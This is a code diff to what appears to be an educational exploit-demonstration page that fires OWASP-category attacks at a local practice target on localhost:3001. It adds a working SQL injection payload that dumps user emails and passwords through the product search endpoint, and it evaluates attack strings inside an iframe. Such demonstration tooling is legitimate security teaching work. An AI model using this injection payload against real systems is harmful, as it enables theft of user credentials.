@@ -62,6 +62,16 @@ const exploitData = {
     custom_behavior: true,
     server_side_exploit: true,
     documentation_html_filepath: "placeholder.html"
+  },
+  "Security Logging and Monitoring Failures": {
+    vulnerable: `??????????????`,
+    url: "http://localhost:3001/rest/products/search?q=",
+    secure: `Secure version not yet implemented`,
+    successful_substring: "secret",
+    attack_request: "window.location.href = 'http://localhost:3001/rest/products/search?q=%27))%20union%20select%20id,email,password,4,5,6,7,8,9%20from%20users--'",
+    custom_behavior: true,
+    server_side_exploit: false,
+    documentation_html_filepath: "placeholder.html"
   }
 }
 
@@ -90,21 +100,24 @@ async function sendExploit() {
         },
         body: JSON.stringify({ exploitType: selectedExploit })
       });
-
       if (response.ok) {
         const result = await response.text();
-        console.log("Response body:", result);
+        alert(result)
 
-        if (exploitData[selectedExploit].custom_behavior) {
-          if(selectedExploit == "Software and Data Integrity Failures"){
+        if (exploitData[selectedExploit].custom_behavior == true) {
+          if (selectedExploit == "Software and Data Integrity Failures") {
             location.reload()
           }
         } else {
           // https://stackoverflow.com/questions/8240101/set-content-of-iframe
-          iframe.src = "about:blank";
-          iframe.contentWindow.document.open();
-          iframe.contentWindow.document.write(result);
-          iframe.contentWindow.document.close();
+          iframe.src = 'about:blank';
+          iframe.onload = function () {
+            iframe.contentWindow.document.open();
+            iframe.contentWindow.document.write(result);
+            iframe.contentWindow.document.close();
+          }
+          console.log("Response body:", result);
+
         }
         if (result.includes(exploitData[selectedExploit].successful_substring)) {
           response_output.innerHTML = "The attack was successful!";
@@ -115,7 +128,14 @@ async function sendExploit() {
         console.log("Error:", response.status, response.statusText);
       }
     } else { // the exploit is to be sent from the iframe.
-
+      
+      if (exploitData[selectedExploit].custom_behavior == true) {
+        if (selectedExploit == "Security Logging and Monitoring Failures") {
+          let url = 'http://localhost:3001/rest/products/search?q=%27))%20union%20select%20id,email,password,4,5,6,7,8,9%20from%20users--'
+          urlbar.value = url
+          iframe.src = url
+        }
+      }
       console.log("Executing in iframe " + exploitData[selectedExploit].attack_request)
       iframe.contentWindow.eval(exploitData[selectedExploit].attack_request);
       result = iframe.contentWindow.document.body.innerText;
@@ -165,6 +185,11 @@ if (savedExploit != null) {
   localStorage.setItem('selectedExploit', exploitSelect.value);
 }
 
+urlbar.addEventListener("keydown", function(event) {
+  if (event.key === "Enter") {
+    iframe.src = urlbar.value;
+  }
+});
 
 exploitSelect.addEventListener("change", updateCode);
 
